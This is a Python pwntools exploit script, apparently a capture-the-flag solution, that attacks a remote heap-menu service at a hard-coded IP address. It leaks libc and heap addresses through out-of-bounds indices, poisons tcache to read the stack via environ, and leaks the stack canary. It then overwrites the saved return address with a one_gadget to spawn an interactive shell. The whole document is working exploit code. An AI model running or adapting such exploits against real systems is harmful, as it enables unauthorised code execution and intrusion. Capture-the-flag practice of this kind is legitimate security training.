from pwn import *
from time import sleep

period=0.4

def new(index,size,data,without_newline=False):
    p.sendline("1")
    sleep(period)
    p.recv(8000)
    p.sendline(str(index))
    sleep(period)
    p.recv(8000)
    p.sendline(str(size))
    sleep(period)
    p.recv(8000)
    if without_newline:
        p.send(data)
        sleep(period)
    else:
        p.sendline(data)
        sleep(period)
    p.recv(8000)
    

def delete(index):
    p.sendline("3")
    sleep(period)
    p.recv(8000)
    p.sendline(str(index))
    sleep(period)
    p.recv(8000)

def show(index):
    p.sendline("2")
    sleep(period)
    p.recv(8000)
    p.sendline(str(index))
    sleep(period)
    p.recvuntil("data: ")
    sleep(period)
    data = p.recvline().strip()
    p.recv(8000)
    return data

#p = process("./chall")
p=remote("69.172.229.147",9001)
pay=str(0xfffd)
p.send(pay+"\x00"*(15-len(pay)))
sleep(period)
data = show(26)
leak = u64(data.ljust(8,"\x00"))
base = leak - 0x199e10
malloc_hook = base + 0x00000000003ebc30
environ = base+0x00000000003ee098
one_gadget=base+0x4f322
print "leak:" ,hex(leak)
print "base: ",hex(base)
print "malloc_hook:" ,hex(malloc_hook)

new(2,64,"aaaa")
new(1,40,"bbbb")
new(2,40,"cccc")
new(3,40,"A"*8)
delete(3)
delete(2)
delete(1)
for i in range(4):
    new(1,40,"AAA")
    delete(1)

heap = show(10)
heap = u64(heap.ljust(8,"\x00"))-0x310
print "heap: ",hex(heap)

new(1,40,p64(environ))

stack=u64(show(52).ljust(8,"\x00"))
saved_rip=stack-0x110
target=stack - 316
canary=stack -287
print "target :",hex(target)
print "saved_rip :",hex(saved_rip)
print "stack :",hex(stack)


new(1,40,p64(heap+0x460))
new(2,40,"BBBB")
delete(58)
delete(1)
delete(2)

new(1,40,p64(target))
new(1,40,p64(canary))
canary=u64("\x00"+show(58)[:7])
print "canary :",hex(canary)

new(1,40,"CCCC")
new(1,40,"A"*8+"B"*4+p64(canary)+"C"*4+"D"*4+p64(one_gadget))
sleep(period)
p.sendline("4")


p.interactive()
